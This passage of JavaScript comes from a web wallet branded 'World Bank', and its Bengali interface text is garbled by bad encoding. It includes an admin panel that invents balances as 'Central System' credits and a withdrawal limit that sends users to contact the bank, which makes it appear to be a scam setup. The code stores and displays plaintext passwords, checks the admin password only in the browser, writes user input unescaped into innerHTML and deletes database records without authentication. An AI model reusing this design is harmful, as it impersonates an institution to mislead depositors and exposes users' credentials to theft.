        if (t.type === 'AdminCredit') statusBadge = `<span class="status-approved">Credited ЁЯПЫя╕П</span>`;
        else if (t.type === 'AdminDebit') statusBadge = `<span class="status-rejected">Debited ЁЯПЫя╕П</span>`;
        else if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved тЬЕ</span>`;
        else if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected тЭМ</span>`;
        
        const curr = t.currency || getUserCurrency(activeUser);
        let typeTitle = t.type;
        if (t.type === 'AdminCredit') typeTitle = 'World Bank Add Balance';
        if (t.type === 'AdminDebit') typeTitle = 'World Bank Deduct Balance';

        tbody.innerHTML += `
            <tr>
                <td>${t.dateStr}</td>
                <td><b>${typeTitle}</b></td>
                <td>${t.method}<br><small style="color:#0284c7;">ржЕржмрж╢рж┐рж╖рзНржЯ: ${curr} ${formatAmountLocale(t.remBal || 0)}</small></td>
                <td style="color:${t.type === 'AdminDebit' ? '#ef4444' : '#059669'}; font-weight:bold;">${t.type === 'AdminDebit' ? '-' : '+'}${curr} ${formatAmountLocale(t.amount)}</td>
                <td><code>${t.trxId}</code></td>
                <td>
                    ${statusBadge}<br>
                    <button type="button" onclick="downloadTransactionReceipt(${t.id})" style="margin-top:4px; background:#0284c7; color:white; border:none; padding:2px 6px; border-radius:4px; font-size:10px; cursor:pointer;">ЁЯУе рж░рж╕рж┐ржж</button>
                </td>
            </tr>`;
    });
}

async function updateUserProfile(e) {
    e.preventDefault();
    if (!activeUser) return;
    activeUser.name = document.getElementById('profNameInput').value;
    activeUser.password = document.getElementById('profPassInput').value;
    if (tempProfilePhotoBase64) activeUser.photo = tempProfilePhotoBase64;

    const userIndex = usersDatabase.findIndex(u => u.phone === activeUser.phone);
    if (userIndex !== -1) {
        usersDatabase[userIndex] = activeUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        saveUserToFirebase(activeUser);
    }
    updateUIHeaderDetails();
    updateAvatarDisplay();
    showCustomAlert("рж╕ржлрж▓", 'ржкрзНрж░рзЛржлрж╛ржЗрж▓ ржЖржкржбрзЗржЯ рж╣рзЯрзЗржЫрзЗ!');
    toggleProfileModal();
}

async function handleTopUpSubmit(e) {
    e.preventDefault();
    showCustomAlert("Mobile Top Up", "ржорзЛржмрж╛ржЗрж▓ ржЯржк ржЖржк ржЕржкрж╢ржиржЯрж┐ ржПржЦржирзЛ ржЪрж╛рж▓рзБ рж╣ржпрж╝ржирж┐!");
}

async function handleCardBankSubmit(e) {
    e.preventDefault();
    showCustomAlert("Notice", "ржкрзНрж░рж╕рзЗрж╕рж┐ржВ-ржП рж░рзЯрзЗржЫрзЗред");
}

async function submitTransactionRequest(e, type) {
    e.preventDefault();
    const form = e.target;
    const method = form.querySelector('.methodSelect').value;
    const phone = form.querySelector('.phoneInput').value;
    const amount = parseFloat(form.querySelector('.amountInput').value);
    const trxId = form.querySelector('.trxInput').value;
    const secPass = form.querySelector('.secPassInput').value;

    if (secPass !== activeUser.password) {
        showCustomAlert("ржкрж╛рж╕ржУрзЯрж╛рж░рзНржб ржнрзБрж▓", 'рж╕ржарж┐ржХ ржкрж╛рж╕ржУрзЯрж╛рж░рзНржб ржжрж┐ржи!');
        return;
    }

    const currentBal = activeUser.totalBalance !== undefined ? parseFloat(activeUser.totalBalance) : 0.00;
    const userLimit = activeUser.withdrawLimit !== undefined ? parseFloat(activeUser.withdrawLimit) : 0.00;
    const userCurr = getUserCurrency(activeUser);

    if (type === 'Withdraw' && currentBal <= 0) {
        showCustomAlert("ржмрзНржпрж╛рж▓рзЗржирзНрж╕ ржирзЗржЗ", "ржЖржкржирж╛рж░ ржкрж░рзНржпрж╛ржкрзНржд ржкрж░рж┐ржорж╛ржг ржмрзНржпрж╛рж▓рзЗржирзНрж╕ ржирж╛ржЗ!");
        return;
    }

    if (type === 'Withdraw' && amount > userLimit) {
        showCustomAlert("рж▓рж┐ржорж┐ржЯ ржЕрждрж┐ржХрзНрж░ржо", `ржЖржкржирж╛рж░ ржЙржЗржержбрзНрж░ / ржмрзНржпрж╛ржВржХ ржЯрзНрж░рж╛ржирзНрж╕ржлрж╛рж░ рж▓рж┐ржорж┐ржЯ ${userCurr} ${userLimit}ред рж▓рж┐ржорж┐ржЯ ржмрж╛рзЬрж╛ржирзЛрж░ ржЬржирзНржп ржмрзНржпрж╛ржВржХрзЗрж░ рж╕рж╛ржерзЗ ржпрзЛржЧрж╛ржпрзЛржЧ ржХрж░рзБржи!`);
        return;
    }

    if (type === 'Withdraw' && amount > currentBal) {
        showCustomAlert("ржЕржкрж░рзНржпрж╛ржкрзНржд ржмрзНржпрж╛рж▓рзЗржирзНрж╕", "ржЖржкржирж╛рж░ ржкрж░рзНржпрж╛ржкрзНржд ржкрж░рж┐ржорж╛ржг ржмрзНржпрж╛рж▓рзЗржирзНрж╕ ржирж╛ржЗ!");
        return;
    }

    const now = new Date();
    const txObj = {
        id: Date.now(), userEmail: activeUser.phone, userName: activeUser.name,
        type: type, method: method, phone: phone, amount: amount, currency: userCurr,
        trxId: trxId, status: 'Pending', remBal: currentBal, dateStr: now.toLocaleDateString('bn-BD'), timeStr: now.toLocaleTimeString('bn-BD')
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    saveTxToFirebase(txObj);

    sendTelegramNotification(`тП│ <b>${type} рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ!</b>\nЁЯСд ржЗржЙржЬрж╛рж░: ${activeUser.name}\nЁЯУ▒ ржиржорзНржмрж░: ${activeUser.phone}\nЁЯПж ржорзЗржержб: ${method}\nЁЯТ░ ржкрж░рж┐ржорж╛ржг: ${userCurr}${amount}\nЁЯФС TrxID: ${trxId}`);
    
    showCustomAlert("рж╕ржлрж▓ рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ", `ржЖржкржирж╛рж░ ${type} рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ ржЬржорж╛ рж╣рзЯрзЗржЫрзЗред`);
    form.reset();
    if(type === 'Deposit') openAddMoneyModal();
    if(type === 'Withdraw') openFundTransferModal();
}

function toggleAdminModal() { document.getElementById('adminModal')?.classList.toggle('hidden'); }

async function verifyAdminPassword() {
    const pass = document.getElementById('adminPassInput').value;
    if (pass === ADMIN_SECURITY_PASS) {
        document.getElementById('adminAuthBox').classList.add('hidden');
        document.getElementById('adminControlBox').classList.remove('hidden');
        renderAdminUsersList();
        renderAdminPendingList();
        renderAdminAllHistory();
        populateAdminUserSelect();
    } else {
        showCustomAlert("рждрзНрж░рзБржЯрж┐", 'ржнрзБрж▓ ржкрж╛рж╕ржУрзЯрж╛рж░рзНржб!');
    }
}

async function refreshAdminData() {
    await syncFromFirebase();
    renderAdminUsersList();
    renderAdminPendingList();
    renderAdminAllHistory();
    populateAdminUserSelect();
    showCustomAlert("рж╕ржлрж▓", 'ржбрж╛ржЯрж╛ рж░рж┐ржлрзНрж░рзЗрж╢ рж╣рзЯрзЗржЫрзЗ!');
}

async function adminDeleteUser(userIdentifier) {
    if (!confirm(`ржЖржкржирж┐ ржХрж┐ ржирж┐рж╢рзНржЪрж┐рждржнрж╛ржмрзЗ ${userIdentifier} ржбрж┐рж▓рж┐ржЯ ржХрж░рждрзЗ ржЪрж╛ржи?`)) return;
    usersDatabase = usersDatabase.filter(u => u.phone !== userIdentifier && u.email !== userIdentifier);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    try {
        await fetch(`${FIREBASE_DB_URL}/users/${sanitizeEmailKey(userIdentifier)}.json`, { method: 'DELETE' });
    } catch(err) { console.error(err); }
    showCustomAlert("рж╕ржлрж▓", 'ржЗржЙржЬрж╛рж░ ржбрж┐рж▓рж┐ржЯ ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗ!');
    renderAdminUsersList();
    populateAdminUserSelect();
}

async function adminUpdateUserWithdrawLimit(e) {
    e.preventDefault();
    const userPhone = document.getElementById('admLimitUserSelect').value;
    const newLimit = parseFloat(document.getElementById('admUserCustomLimitInput').value);
    const userIndex = usersDatabase.findIndex(u => u.phone === userPhone);
    if (userIndex !== -1) {
        usersDatabase[userIndex].withdrawLimit = newLimit;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        saveUserToFirebase(usersDatabase[userIndex]);
        showCustomAlert("рж╕ржлрж▓", 'ржЗржЙржЬрж╛рж░рзЗрж░ ржЙржЗржержбрзНрж░ ржУ ржЯрзНрж░рж╛ржирзНрж╕ржлрж╛рж░ рж▓рж┐ржорж┐ржЯ рж╕рзЗржн рж╣рзЯрзЗржЫрзЗ!');
        renderAdminUsersList();
        if (activeUser && activeUser.phone === userPhone) {
            activeUser.withdrawLimit = newLimit;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        }
    }
}

function populateAdminUserSelect() {
    const balSelect = document.getElementById('admBalanceUserSelect');
    const limSelect = document.getElementById('admLimitUserSelect');
    if (balSelect) balSelect.innerHTML = '<option value="">ржЗржЙржЬрж╛рж░ рж╕рж┐рж▓рзЗржХрзНржЯ ржХрж░рзБржи</option>';
    if (limSelect) limSelect.innerHTML = '<option value="">ржЗржЙржЬрж╛рж░ рж╕рж┐рж▓рзЗржХрзНржЯ ржХрж░рзБржи</option>';

    usersDatabase.forEach(u => {
        const opt = `<option value="${u.phone}">${u.name} (${u.phone})</option>`;
        if (balSelect) balSelect.innerHTML += opt;
        if (limSelect) limSelect.innerHTML += opt;
    });
}

async function adminUpdateUserBalance(e) {
    e.preventDefault();
    const userIdentifier = document.getElementById('admBalanceUserSelect').value;
    const actionType = document.getElementById('admBalanceActionType').value;
    const inputAmount = parseFloat(document.getElementById('admBalanceAmount').value);

    if (!userIdentifier || isNaN(inputAmount)) return;

    const userIndex = usersDatabase.findIndex(u => u.phone === userIdentifier);
    if (userIndex !== -1) {
        const user = usersDatabase[userIndex];
        let oldBalance = parseFloat(user.totalBalance || 0);
        let newBalance = oldBalance;
        let txType = 'AdminCredit';

        if (actionType === 'ADD') {
            newBalance = oldBalance + inputAmount;
            txType = 'AdminCredit';
        } else if (actionType === 'DEDUCT') {
            newBalance = Math.max(0, oldBalance - inputAmount);
            txType = 'AdminDebit';
        } else if (actionType === 'SET') {
            newBalance = inputAmount;
            txType = inputAmount >= oldBalance ? 'AdminCredit' : 'AdminDebit';
        }

        user.totalBalance = newBalance;
        usersDatabase[userIndex] = user;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        saveUserToFirebase(user);

        const now = new Date();
        const txObj = {
            id: Date.now(), 
            userEmail: user.phone, 
            userName: user.name,
            type: txType, 
            method: 'World Bank Central System', 
            phone: user.phone, 
            amount: inputAmount, 
            currency: getUserCurrency(user),
            remBal: newBalance,
            trxId: 'WB_SYS_' + Math.floor(100000 + Math.random() * 900000),
            status: 'Approved', 
            dateStr: now.toLocaleDateString('bn-BD'), 
            timeStr: now.toLocaleTimeString('bn-BD')
        };

        allTransactions.unshift(txObj);
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        saveTxToFirebase(txObj);

        sendTelegramNotification(`ЁЯПЫя╕П <b>ржПржбржорж┐ржи ржмрзНржпрж╛рж▓рзЗржирзНрж╕ ржЖржкржбрзЗржЯ!</b>\nЁЯСд ржЗржЙржЬрж╛рж░: ${user.name}\nЁЯУ▒ ржиржорзНржмрж░: ${user.phone}\nЁЯФД ржЯрж╛ржЗржк: ${actionType}\nЁЯТ░ ржкрж░рж┐ржорж╛ржг: ${getUserCurrency(user)}${inputAmount}\nЁЯТ╡ ржЕржмрж╢рж┐рж╖рзНржЯ ржмрзНржпрж╛рж▓рзЗржирзНрж╕: ${getUserCurrency(user)}${newBalance}`);

        showCustomAlert("рж╕ржлрж▓", `ржЗржЙржЬрж╛рж░рзЗрж░ ржмрзНржпрж╛рж▓рзЗржирзНрж╕ рж╕ржлрж▓ржнрж╛ржмрзЗ ржЖржкржбрзЗржЯ ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗред ржирждрзБржи ржмрзНржпрж╛рж▓рзЗржирзНрж╕: ${getUserCurrency(user)}${newBalance}`);
        renderAdminUsersList();

        if (activeUser && activeUser.phone === user.phone) {
            activeUser = user;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
            renderNotificationsList();
        }
        e.target.reset();
    }
}

function renderAdminUsersList() {
    const tbody = document.getElementById('adminUsersListBody');
    if (!tbody) return;
    tbody.innerHTML = '';
    usersDatabase.forEach(u => {
        const curr = getUserCurrency(u);
        tbody.innerHTML += `
            <tr>
                <td>ЁЯСд</td>
                <td><b>${u.name}</b></td>
                <td>${u.phone}</td>
                <td>${curr}</td>
                <td style="color:#f43f5e;">${u.password}</td>
                <td>${curr} ${formatAmountLocale(u.totalBalance || 0)}</td>
                <td>${curr} ${formatAmountLocale(u.withdrawLimit || 0)}</td>
                <td><button type="button" onclick="adminDeleteUser('${u.phone}')" class="btn-delete-user">Delete</button></td>
            </tr>`;
    });
}

function renderAdminPendingList() {
    const tbody = document.getElementById('adminPendingTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';
    const pendingTxs = allTransactions.filter(t => t.status === 'Pending');
    
    if (pendingTxs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; color:#94a3b8;">ржХрзЛржирзЛ рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ ржирзЗржЗред</td></tr>`;
        return;
    }

    pendingTxs.forEach(t => {
        tbody.innerHTML += `
            <tr>
                <td><b>${t.userName || t.userEmail}</b></td>
                <td style="color:#f59e0b;"><b>${t.type}</b></td>
                <td>${t.method}</td>
                <td>${t.phone}</td>
                <td>${t.currency || 'рз│'} ${formatAmountLocale(t.amount)}</td>
                <td><code>${t.trxId}</code></td>
                <td>
                    <button type="button" onclick="approveTransaction(${t.id})" class="btn-approve">Approve</button>
                    <button type="button" onclick="rejectTransaction(${t.id})" class="btn-reject">Reject</button>
                </td>
            </tr>`;
    });
}

function renderAdminAllHistory() {
    const tbody = document.getElementById('adminAllHistoryTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';
    allTransactions.forEach(t => {
        tbody.innerHTML += `
            <tr>
                <td><b>${t.userName || t.userEmail}</b></td>
                <td>${t.type}</td>
                <td>${t.method}</td>
                <td>${t.currency || 'рз│'} ${formatAmountLocale(t.amount)}</td>
                <td><code>${t.trxId}</code></td>
                <td>${t.status}</td>
            </tr>`;
    });
}

async function approveTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex === -1) return;
    const tx = allTransactions[txIndex];
    const userIndex = usersDatabase.findIndex(u => u.phone === tx.userEmail);

    if (userIndex !== -1) {
        const targetUser = usersDatabase[userIndex];
        if (!targetUser.balances) targetUser.balances = { ...defaultBalances };
        if (targetUser.totalBalance === undefined) targetUser.totalBalance = 0.00;

        if (['Withdraw', 'TopUp', 'Remittance/Bank'].includes(tx.type)) {
            targetUser.totalBalance -= tx.amount;
        } else if (tx.type === 'Deposit') {
            targetUser.totalBalance += tx.amount;
        }

        usersDatabase[userIndex] = targetUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        saveUserToFirebase(targetUser);

        allTransactions[txIndex].status = 'Approved';
        allTransactions[txIndex].remBal = targetUser.totalBalance;
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        saveTxToFirebase(allTransactions[txIndex]);

        sendTelegramNotification(`тЬЕ <b>рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ ржЕржирзБржорзЛржжрж┐ржд!</b>\nЁЯСд ржЗржЙржЬрж╛рж░: ${targetUser.name}\nЁЯТ░ ржкрж░рж┐ржорж╛ржг: ${tx.currency || 'рз│'}${tx.amount}\nЁЯТ╡ ржмрж░рзНрждржорж╛ржи ржмрзНржпрж╛рж▓рзЗржирзНрж╕: ${tx.currency || 'рз│'}${targetUser.totalBalance}`);

        showCustomAlert("рж╕ржлрж▓", 'ржЕрзНржпрж╛ржкрзНрж░рзБржн ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗ!');
        if (activeUser && activeUser.phone === targetUser.phone) {
            activeUser = targetUser;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
        }
        renderAdminPendingList();
        renderAdminUsersList();
        renderAdminAllHistory();
        renderNotificationsList();
    }
}

async function rejectTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex !== -1) {
        allTransactions[txIndex].status = 'Rejected';
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        saveTxToFirebase(allTransactions[txIndex]);

        sendTelegramNotification(`тЭМ <b>рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ ржмрж╛рждрж┐рж▓ ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗ!</b>\nЁЯСд ржЗржЙржЬрж╛рж░: ${allTransactions[txIndex].userName}\nЁЯТ░ ржкрж░рж┐ржорж╛ржг: ${allTransactions[txIndex].amount}`);

        showCustomAlert("рж╕ржлрж▓", 'рж░рж┐ржЬрзЗржХрзНржЯ ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗред');
        renderAdminPendingList();
        renderAdminAllHistory();
        renderNotificationsList();
    }
}
